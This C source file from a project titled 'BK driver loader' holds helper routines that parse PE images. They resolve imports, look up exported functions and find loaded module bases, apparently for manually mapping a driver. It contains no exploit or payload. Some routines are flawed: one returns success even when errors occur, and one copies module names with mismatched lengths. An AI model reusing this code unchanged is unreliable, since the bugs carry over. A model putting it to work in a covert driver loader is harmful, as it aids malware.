//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.
//	
// module: pesup.h
// description: 
//	BK helper library. PE-structure support routines.

#include "..\bkgen\main.h"
#include "pesup.h"
#include "crtsup.h"

#define  MAX_DLL_NAME	0x40	// bytes



static NTSTATUS ImportScanLoop(
					PCHAR	ModuleBase, 
					ULONG	SizeOfImage,
					PVOID	ImportedModuleBase,
					ULONG   rvaINT,
					ULONG   rvaIAT
					)
{
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	PIAT_ENTRY	pIatEntry = NULL;
	PIMAGE_IMPORT_BY_NAME   pOrdinalName;
	PIMAGE_THUNK_DATA		pINT;
	PIMAGE_THUNK_DATA		pIAT;
	IAT_ENTRY				IatEntry;

	if ( rvaINT == 0 )   // No Characteristics field?
	{	
		// Yes! Gotta have a non-zero FirstThunk field then.
		rvaINT = rvaIAT;
	     
		if ( rvaINT == 0 )   // No FirstThunk field?  Ooops!!!
			return(STATUS_INVALID_IMAGE_FORMAT);
	}
        
	// Adjust the pointer to point where the tables are in the
	// mem mapped file.
	pINT = (PIMAGE_THUNK_DATA)PeSupRvaToVa(rvaINT, ModuleBase);
	if (!pINT )
		return(STATUS_INVALID_IMAGE_FORMAT);
		
	pIAT = (PIMAGE_THUNK_DATA)PeSupRvaToVa(rvaIAT, ModuleBase);

	while (TRUE) // Loop forever (or until we break out)
	{
		if ( pINT->u1.AddressOfData == 0 )
			break;

		if ( IMAGE_SNAP_BY_ORDINAL(pINT->u1.Ordinal) == FALSE)
		{
			pOrdinalName = (PIMAGE_IMPORT_BY_NAME)PeSupRvaToVa((ULONG)pINT->u1.AddressOfData, ModuleBase);
		}
		else if( pINT->u1.Ordinal >= (ULONG_PTR)ModuleBase &&
		 	 pINT->u1.Ordinal < ((ULONG_PTR)ModuleBase + SizeOfImage))
		{
			pOrdinalName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)pINT->u1.AddressOfData);
		}
		else
			pOrdinalName = NULL;


		if (pOrdinalName)
		{
			if (IatEntry = (IAT_ENTRY)PeSupGetFunctionAddress(ImportedModuleBase, (PCHAR)&pOrdinalName->Name))
			{
				pIatEntry = &pIAT->u1.Function;
				*pIatEntry = IatEntry;
			}
			else
			{
				ntStatus = STATUS_PROCEDURE_NOT_FOUND;
				break;
			}
		}	// if (pOrdinalName)

		pINT++;         // advance to next thunk
		pIAT++;         // advance to next thunk
	} // while (TRUE)	

	return(ntStatus);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Resolves specified image import based on the specified list of loaded modules.
NTSTATUS	PeSupResolveImageImport(
						PVOID		LoadedModuleList,
					    PVOID		ImageBase
						)
{
	ULONG   importsStartRVA;
	PCHAR   ModuleName;
	PCHAR	ModuleBase = (PCHAR)ImageBase;
	PVOID	ImportedModuleBase = NULL;
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	PIAT_ENTRY	pIatEntry = NULL;
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc;


	PIMAGE_NT_HEADERS	PEHeader = (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(ModuleBase);

	// Get the import table RVA from the data dir
	importsStartRVA = 
		PEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

	if ( !importsStartRVA )
		return(STATUS_INVALID_PARAMETER);

	pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)PeSupRvaToVa(importsStartRVA, ModuleBase);

	if ( !pImportDesc )
		return(STATUS_INVALID_PARAMETER);

	// Find the import descriptor containing references to callee's functions
	for (; pImportDesc->Name; pImportDesc++) 
	{		
		if (ModuleName = (PCHAR)PeSupRvaToVa(pImportDesc->Name, ModuleBase))
		{
			if (ImportedModuleBase = PeSupGetModuleBase(LoadedModuleList, ModuleName))
			{
				ntStatus = ImportScanLoop(ModuleBase, PEHeader->OptionalHeader.SizeOfImage, ImportedModuleBase, 
					pImportDesc->OriginalFirstThunk, pImportDesc->FirstThunk);

				if (!(NT_SUCCESS(ntStatus)))
					break;
			}	// if (ImportedBase = PeSupGetModuleBase(LoadedModuleList, ModuleName))
			else
			{
				ntStatus = STATUS_INVALID_IMPORT_OF_NON_DLL;
				break;

			}
		} // if(ModuleName = (PCHAR)PeSupRvaToVa
	} // for (; pImportDesc->Name; pImportDesc++) 

	return(STATUS_SUCCESS);
}

static PIMAGE_EXPORT_DIRECTORY PeSupGetImageExportDirectory(PCHAR ModuleBase)
{
	PIMAGE_NT_HEADERS32		PEHeader32	= (PIMAGE_NT_HEADERS32)PeSupGetImagePeHeader(ModuleBase);
	PIMAGE_NT_HEADERS64		PEHeader64	= (PIMAGE_NT_HEADERS64)PEHeader32;
	PIMAGE_EXPORT_DIRECTORY	ExportDirectory;

	if (PEHeader32->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
		ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ModuleBase + PEHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	else
		ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ModuleBase + PEHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

	return(ExportDirectory);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Searches for Export table entry of a specified function within a specified module. Returns pointer to the found entry 
//	 or NULL if no such function found within module export.
//
static PEXPORT_ENTRY	PeSupGetExportEntry( 
					HMODULE  TargetModule,		// Image base of the target module (where exported function located)
					PCHAR    ExportedFunction	// exported function name
		)
{
	PIMAGE_EXPORT_DIRECTORY pExpDir			= NULL;
	PULONG   ppFunctions					= NULL;
	PULONG   ppNames						= NULL;
	PUSHORT  pOrdinals						= NULL;
	ULONG	 NumberOfNames					= 0;
	ULONG	 OldPointer						= 0;
	ULONG	 i;

	NTSTATUS ntStatus = STATUS_SUCCESS;
	PCHAR	 ModuleBase = (PCHAR)TargetModule;
	
	PEXPORT_ENTRY	FoundEntry				= NULL;
	PIMAGE_NT_HEADERS PEHeader	= (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(ModuleBase);

	// Get export directory
	pExpDir = PeSupGetImageExportDirectory(ModuleBase);

	if (pExpDir == NULL || pExpDir->AddressOfFunctions == 0 || pExpDir->AddressOfNames == 0 )
		return NULL;


	// Get names, functions and ordinals arrays pointers
	ppFunctions = (PULONG) (ModuleBase + (ULONG)pExpDir ->AddressOfFunctions );
	ppNames = (PULONG) (ModuleBase + (ULONG)pExpDir ->AddressOfNames );
	pOrdinals = (PUSHORT) (ModuleBase + (ULONG)pExpDir ->AddressOfNameOrdinals );

	NumberOfNames = pExpDir->NumberOfNames;

	// Walk the export table entries
	for ( i = 0; i < NumberOfNames; ++i )
	{
		// Check if function name matches current entry
		if   (!__strcmp(ModuleBase + *ppNames, ExportedFunction))
		{
			FoundEntry = (PEXPORT_ENTRY)&ppFunctions [*pOrdinals];
			break;
		}
		ppNames++;
		pOrdinals++;
	}

	return(FoundEntry);
}


				
// Retrieves the address of an exported function or variable from the specified module.
PVOID	PeSupGetFunctionAddress(
						HMODULE		ImageBase,			// target module base
						PCHAR		FunctionName		// target function name
						)
{
	PVOID			Address = NULL;
	PEXPORT_ENTRY	pExportEntry = {0};
	if (pExportEntry = PeSupGetExportEntry(ImageBase, FunctionName))
		Address = (PVOID)((PCHAR)ImageBase + *pExportEntry);

	return(Address);
}


// Retrieves a module base for the specified module from the specified list of loaded modules.
PVOID	PeSupGetModuleBase(
					   PLIST_ENTRY	LoadedModuleList,
					   PCHAR		ModuleName
					   )
{
	BOOL	Found = FALSE;
	CHAR	ShortName[MAX_DLL_NAME];
	PVOID	ModuleBase = NULL;
	PLIST_ENTRY	pEntry;
	PLDR_DATA_TABLE_ENTRY	LdrEntry;
	ULONG	NameLen = (ULONG)__strlen(ModuleName);
	
	pEntry = LoadedModuleList->Flink;
	
	while(pEntry != LoadedModuleList)
	{
		LdrEntry = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);
		if (LdrEntry->BaseDllName.Length < MAX_DLL_NAME)
		{
			ULONG i;
			PCHAR Dot;

			for (i=0; i<LdrEntry->BaseDllName.Length; i++)
				ShortName[i] = (CHAR)LdrEntry->BaseDllName.Buffer[i];
			ShortName[NameLen] = 0;

			if (__stricmp(ShortName, ModuleName) == 0)
			{
				Found = TRUE;
				break;
			}
			if (Dot = __strchr(ShortName, '.'))
			{
				Dot[0] = 0;
				if (__stricmp(ShortName, ModuleName) == 0)
				{
					Found = TRUE;
					break;
				}
			}	// if (Dot = strchr(ShortName, '.'))
		}	// if (LdrEntry->BaseDllName.Length < MAX_DLL_NAME)
		pEntry = pEntry->Flink;
	 }	//  while(pEntry != LoadedModuleList)

	 if (Found)
		 ModuleBase = LdrEntry->DllBase;

	 return(ModuleBase);
 }
